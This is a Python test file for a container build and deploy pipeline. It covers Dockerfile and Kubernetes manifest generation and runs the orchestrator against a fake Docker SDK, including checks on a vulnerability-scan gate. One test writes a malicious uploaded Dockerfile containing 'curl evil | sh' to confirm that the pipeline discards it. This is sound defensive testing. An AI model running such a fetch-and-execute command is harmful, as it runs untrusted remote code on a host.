"""Pipeline logic tests.

Two kinds, clearly separated:
  * GeneratorTests - pure functions (Dockerfile, nginx, manifests, detection).
  * OrchestrationTests - run_pipeline() against a FAKE Docker SDK. These prove
    step ordering, failure handling, cleanup and the security gate. They do NOT
    prove that real Docker builds work (that is tested separately and is BLOCKED
    when Docker is unavailable).
"""
import asyncio
import dataclasses
import unittest
from unittest import mock

from ._helpers import FIXTURES, tmpdir

from backend.errors import DockerUnavailable
from backend.services import archive, docker_client, jobs, pipeline, trivy
from backend.services.jobs import JobStore


class GeneratorTests(unittest.TestCase):
    def test_static_dockerfile(self):
        self.assertIn("FROM nginx:1.27-alpine", pipeline.STATIC_DOCKERFILE)

    def test_node_dockerfile_ignores_scripts_and_has_test_stage(self):
        text = pipeline.node_dockerfile(ignore_scripts=True, with_tests=True)
        self.assertIn("--ignore-scripts", text)
        self.assertIn("AS test", text)
        self.assertIn("CI=true npm test", text)
        self.assertEqual(text.count("FROM "), 4)  # deps, test, builder, nginx

    def test_node_dockerfile_without_tests(self):
        text = pipeline.node_dockerfile(ignore_scripts=False, with_tests=False)
        self.assertNotIn("AS test", text)
        self.assertNotIn("--ignore-scripts", text)

    def test_nginx_has_health_endpoint(self):
        self.assertIn("location = /healthz", pipeline.NGINX_CONF)

    def test_tag_is_versioned_and_valid(self):
        tag = pipeline.make_tag("my-app", "job-7-1700000000")
        name, version = tag.split(":")
        self.assertEqual(name, "my-app")
        self.assertRegex(version, r"^\d{8}-\d{6}-7$")

    def test_manifests(self):
        m = pipeline.build_manifests("demo", "reg/demo:1", 80, change_cause="nexus deploy reg/demo:1")
        d = m["deployment"]
        self.assertEqual(d["spec"]["revisionHistoryLimit"], 5)
        c = d["spec"]["template"]["spec"]["containers"][0]
        self.assertEqual(c["image"], "reg/demo:1")
        self.assertEqual(c["readinessProbe"]["httpGet"]["path"], "/healthz")
        self.assertIn("limits", c["resources"])
        self.assertEqual(d["metadata"]["annotations"]["kubernetes.io/change-cause"], "nexus deploy reg/demo:1")
        self.assertEqual(m["service"]["spec"]["ports"][0]["targetPort"], 80)

    def test_nextjs_uses_tcp_probe(self):
        m = pipeline.build_manifests("n", "i:1", 3000)
        probe = m["deployment"]["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]
        self.assertIn("tcpSocket", probe)

    def test_write_build_context_ignores_uploaded_dockerfile(self):
        root = tmpdir()
        (root / "index.html").write_text("x")
        (root / "Dockerfile").write_text("FROM evil\nRUN curl evil | sh\n")
        pipeline.write_build_context(pipeline.detect_project(root))
        self.assertNotIn("evil", (root / "Dockerfile").read_text())

    def test_node_without_build_script_rejected(self):
        root = tmpdir()
        (root / "package.json").write_text('{"name":"x","scripts":{}}')
        with self.assertRaises(pipeline.PipelineError) as ctx:
            pipeline.write_build_context(pipeline.detect_project(root))
        self.assertEqual(ctx.exception.code, "no_build_script")


# ---------------------------------------------------------------------------
# Fake Docker SDK
# ---------------------------------------------------------------------------
class _Errors:
    class DockerException(Exception): pass
    class APIError(DockerException):
        explanation = "boom"
    class NotFound(DockerException): pass


class FakeContainer:
    def __init__(self, healthy=True, status="running"):
        self.status, self.healthy = status, healthy
        self.attrs = {"State": {}}
    def reload(self): pass
    def logs(self, tail=0): return b"nginx: [emerg] something"
    def exec_run(self, cmd): return (0 if self.healthy else 1, b"")
    def remove(self, force=False): pass


class FakeDockerClient:
    def __init__(self, build_error=None, healthy=True):
        self.builds, self.build_error, self.healthy = [], build_error, healthy
        self.contexts = {}
        self.api = self
        self.images = self
        self.containers = self
        self.run_calls = []
        self.started = {}

    # api.build
    def build(self, path, tag, target=None, **kw):
        from pathlib import Path
        self.builds.append({"tag": tag, "target": target, "limits": kw.get("container_limits")})
        self.contexts[target or "final"] = (Path(path) / "Dockerfile").read_text()
        yield {"stream": "Step 1/3 : FROM nginx\n"}
        if self.build_error:
            yield {"error": self.build_error}
            return
        yield {"stream": "Successfully built abc\n"}

    def remove(self, *a, **k): pass
    def prune(self, **k): return {"SpaceReclaimed": 0}
    def get(self, name):
        if name not in self.started:
            raise _Errors.NotFound()
        return self.started[name]
    def run(self, image, **kw):
        self.run_calls.append((image, kw))
        c = FakeContainer(self.healthy)
        self.started[kw["name"]] = c
        return c
    def close(self): pass


class FakeSDK:
    errors = _Errors


def new_settings(**over):
    base = dataclasses.replace(pipeline.settings, work_dir=str(tmpdir()), data_dir=str(tmpdir()),
                               registry_url=None, ecr_repository_prefix=None, git_repo_url=None,
                               argocd_url=None, k8s_image_source="registry", trivy_fail_on="CRITICAL",
                               health_check_timeout_s=2, npm_ignore_scripts=True, run_tests=True)
    return dataclasses.replace(base, **over)


def run_job(zip_key, fake_client=None, docker_error=None, settings_over=None, scans=None):
    """Run the real orchestrator with Docker faked. Returns (job, fake_client)."""
    s = new_settings(**(settings_over or {}))
    store = JobStore(persist=False)
    fake = fake_client or FakeDockerClient()

    def get_client():
        if docker_error:
            raise docker_error
        return fake

    zip_copy = tmpdir() / "u.zip"
    zip_copy.write_bytes(FIXTURES[zip_key].read_bytes())
    info = archive.inspect_archive(zip_copy, "x.zip")

    async def go():
        job = store.create("demo", info)
        await pipeline.run_pipeline(job, zip_copy)
        return job

    scan_patch = (mock.patch.object(pipeline.trivy, "scan_filesystem", side_effect=lambda *a, **k: scans[0]),
                  mock.patch.object(pipeline.trivy, "scan_image", side_effect=lambda *a, **k: scans[1])) if scans else \
                 (mock.patch.object(trivy, "trivy_path", return_value=None), mock.patch.object(trivy, "settings", s))
    with mock.patch.object(pipeline, "settings", s), mock.patch.object(pipeline, "job_store", store), \
         mock.patch.object(archive, "settings", s), mock.patch.object(trivy, "settings", s), \
         mock.patch.object(docker_client, "get_client", get_client), \
         mock.patch.object(docker_client, "_sdk", return_value=FakeSDK), \
         mock.patch.object(pipeline.time, "sleep"), scan_patch[0], scan_patch[1]:
        job = asyncio.run(go())
    return job, fake


class OrchestrationTests(unittest.TestCase):
    def test_static_site_local_preview_success(self):
        job, fake = run_job("static")
        self.assertEqual(job.status, "success", job.error)
        self.assertEqual(job.mode, "local")
        self.assertEqual(job.steps["upload"], "success")
        self.assertEqual(job.steps["test"], "skipped")
        self.assertEqual(job.steps["build"], "success")
        self.assertEqual(job.steps["security"], "skipped")      # Trivy not installed -> honest skip
        self.assertEqual(job.steps["publish"], "skipped")
        self.assertEqual(job.steps["verify"], "success")
        self.assertTrue(job.health["verified"])
        self.assertRegex(job.preview_url, r"^http://localhost:\d+$")
        self.assertIn("FROM nginx", fake.contexts["final"])
        self.assertEqual(fake.builds[0]["limits"]["memory"], 2048 * 1024 * 1024)
        self.assertEqual(fake.run_calls[0][1]["security_opt"], ["no-new-privileges"])
        self.assertEqual(fake.run_calls[0][1]["ports"]["80/tcp"][0], "127.0.0.1")

    def test_react_vite_runs_test_stage_then_final_build(self):
        job, fake = run_job("react")
        self.assertEqual(job.status, "success", job.error)
        self.assertEqual([b["target"] for b in fake.builds], ["test", None])
        self.assertEqual(job.steps["test"], "success")
        self.assertIn("--ignore-scripts", fake.contexts["final"])
        self.assertEqual(job.project["framework"], "React (Vite)")

    def test_docker_not_running_fails_cleanly(self):
        err = DockerUnavailable("Docker Desktop is installed but not running.", code="desktop_not_running")
        job, _ = run_job("static", docker_error=err)
        self.assertEqual(job.status, "failed")
        self.assertIn("Docker Desktop", job.error)
        self.assertEqual(job.health["code"], "desktop_not_running")
        self.assertEqual(job.steps["build"], "pending")

    def test_build_failure_marks_build_step(self):
        job, _ = run_job("static", fake_client=FakeDockerClient(build_error="npm ERR! missing script: build"))
        self.assertEqual(job.status, "failed")
        self.assertEqual(job.steps["build"], "failed")
        self.assertIn("npm ERR", job.error)
        self.assertEqual(job.steps["deploy"], "pending")

    def test_failed_health_check_is_a_failed_release(self):
        job, _ = run_job("static", fake_client=FakeDockerClient(healthy=False))
        self.assertEqual(job.status, "failed")
        self.assertEqual(job.steps["verify"], "failed")

    def test_security_gate_blocks_before_publish(self):
        bad = {"scanner": "trivy", "scanType": "image", "status": "completed", "target": "x", "total": 1,
               "counts": {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "UNKNOWN": 0}, "findings": [],
               "gate": trivy.evaluate_gate({"CRITICAL": 1}, "CRITICAL")}
        ok = {**bad, "scanType": "fs", "counts": {k: 0 for k in bad["counts"]}, "gate": trivy.evaluate_gate({}, "CRITICAL")}
        job, fake = run_job("static", scans=[ok, bad])
        self.assertEqual(job.status, "failed")
        self.assertEqual(job.steps["security"], "failed")
        self.assertEqual(job.steps["publish"], "pending")
        self.assertEqual(fake.run_calls, [])          # nothing was deployed
        self.assertEqual(len(job.scans), 2)

    def test_security_gate_passes_when_clean(self):
        clean = {"scanner": "trivy", "scanType": "fs", "status": "completed", "target": "x", "total": 0,
                 "counts": {k: 0 for k in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "UNKNOWN")}, "findings": [],
                 "gate": trivy.evaluate_gate({}, "CRITICAL")}
        job, _ = run_job("static", scans=[clean, {**clean, "scanType": "image"}])
        self.assertEqual(job.status, "success", job.error)
        self.assertEqual(job.steps["security"], "success")

    def test_scan_error_stops_release_when_enforced(self):
        err = {"scanner": "trivy", "scanType": "fs", "status": "error", "error": "db download failed",
               "counts": {}, "findings": [], "gate": None}
        job, _ = run_job("static", scans=[err, {**err, "scanType": "image"}])
        self.assertEqual(job.status, "failed")
        self.assertIn("could not complete", job.error)

    def test_workspace_is_cleaned_up(self):
        s = new_settings()
        job, _ = run_job("static", settings_over={"work_dir": s.work_dir})
        from pathlib import Path
        self.assertFalse((Path(s.work_dir) / job.id).exists())


if __name__ == "__main__":
    unittest.main()
